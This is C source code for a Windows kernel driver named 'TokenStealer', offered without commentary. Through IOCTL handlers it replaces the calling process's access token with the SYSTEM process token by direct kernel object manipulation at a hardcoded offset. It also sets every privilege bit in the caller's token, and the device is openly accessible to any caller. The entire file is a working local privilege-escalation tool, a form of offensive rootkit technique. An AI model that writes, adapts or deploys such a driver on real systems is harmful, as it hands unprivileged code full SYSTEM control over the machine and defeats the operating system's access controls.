#include <ntifs.h>

// IOCTL Code
#define IOCTL_STEAL_TOKEN CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_PATCH_TOKEN CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _SEP_TOKEN_PRIVILEGES {
    UINT64 Present;
    UINT64 Enabled;
    UINT64 EnabledByDefault;
} SEP_TOKEN_PRIVILEGES, * PSEP_TOKEN_PRIVILEGES;

#define TOKEN_PRIVILEGES_OFFSET 0x40 
#define TOKEN_OFFSET 0x248 

void DriverUnload(PDRIVER_OBJECT pDriverObject) {
    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\TokenStealer");
    IoDeleteSymbolicLink(&symLink);
    IoDeleteDevice(pDriverObject->DeviceObject);
    DbgPrint("[-] Driver Unloaded.\n");
}

NTSTATUS StealTokenHandler() {
    PEPROCESS CurrentProcess = NULL;
    PEPROCESS SystemProcess = NULL;
    NTSTATUS status;

    // get system process handle
    status = PsLookupProcessByProcessId((HANDLE)4, &SystemProcess);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    // get caller process handle
    CurrentProcess = PsGetCurrentProcess();

    // find token address
    UINT64* pSystemToken = (UINT64*)((UINT64)SystemProcess + TOKEN_OFFSET);
    UINT64* pCurrentToken = (UINT64*)((UINT64)CurrentProcess + TOKEN_OFFSET);

    // DKOM (Direct Kernel Object Manipulation)
    // overwrite current process token with system process token
    DbgPrint("[*] Old Token: %llx\n", *pCurrentToken);
    *pCurrentToken = *pSystemToken;
    DbgPrint("[*] New Token (Stolen): %llx\n", *pCurrentToken);

    ObDereferenceObject(SystemProcess);

    return STATUS_SUCCESS;
}

NTSTATUS PatchTokenHandler() {
    PEPROCESS CurrentProcess = PsGetCurrentProcess();

    // get process token
    UINT64* pFastRefToken = (UINT64*)((UINT64)CurrentProcess + TOKEN_OFFSET);
    UINT64 FastRefValue = *pFastRefToken;
    UINT64 TokenAddress = FastRefValue & ~0xF;

    DbgPrint("[*] Current Token Address: %llx\n", TokenAddress);

    // Privileges = Token Address + 0x40
    PSEP_TOKEN_PRIVILEGES pPrivileges = (PSEP_TOKEN_PRIVILEGES)(TokenAddress + TOKEN_PRIVILEGES_OFFSET);

    // enable SeDebugPrivilege
    pPrivileges->Present = 0xFFFFFFFFFFFFFFFF;
    pPrivileges->Enabled = 0xFFFFFFFFFFFFFFFF;
    pPrivileges->EnabledByDefault = 0xFFFFFFFFFFFFFFFF;

    DbgPrint("[+] Token Privileges Patched! You are now god-like.\n");

    return STATUS_SUCCESS;
}

// IOCTL handler
NTSTATUS DriverDispatch(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
    UNREFERENCED_PARAMETER(pDeviceObject);
    PIO_STACK_LOCATION pIoStackLocation = IoGetCurrentIrpStackLocation(pIrp);
    NTSTATUS status = STATUS_SUCCESS;

    switch (pIoStackLocation->MajorFunction) {
    case IRP_MJ_CREATE:
    case IRP_MJ_CLOSE:
        break;
    case IRP_MJ_DEVICE_CONTROL:
        if (pIoStackLocation->Parameters.DeviceIoControl.IoControlCode == IOCTL_STEAL_TOKEN) {
            DbgPrint("[+] IOCTL Received. Starting Token Stealing...\n");
            status = StealTokenHandler();
        }
        else if (pIoStackLocation->Parameters.DeviceIoControl.IoControlCode == IOCTL_PATCH_TOKEN) {
            DbgPrint("[+] IOCTL_PATCH_TOKEN Received.\n");
            status = PatchTokenHandler();
        }
        break;
    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }

    pIrp->IoStatus.Status = status;
    pIrp->IoStatus.Information = 0;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return status;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath) {
    UNREFERENCED_PARAMETER(pRegistryPath);
    DbgPrint("[+] Driver Loaded!\n");

    // unload function
    pDriverObject->DriverUnload = DriverUnload;

    // IRP function
    pDriverObject->MajorFunction[IRP_MJ_CREATE] = DriverDispatch;
    pDriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverDispatch;
    pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverDispatch;

    // create driver object
    UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\TokenStealer");
    PDEVICE_OBJECT pDeviceObject;
    NTSTATUS status = IoCreateDevice(pDriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, FALSE, &pDeviceObject);

    if (!NT_SUCCESS(status)) return status;

    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\TokenStealer");
    status = IoCreateSymbolicLink(&symLink, &devName);

    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(pDeviceObject);
    }

    return status;
}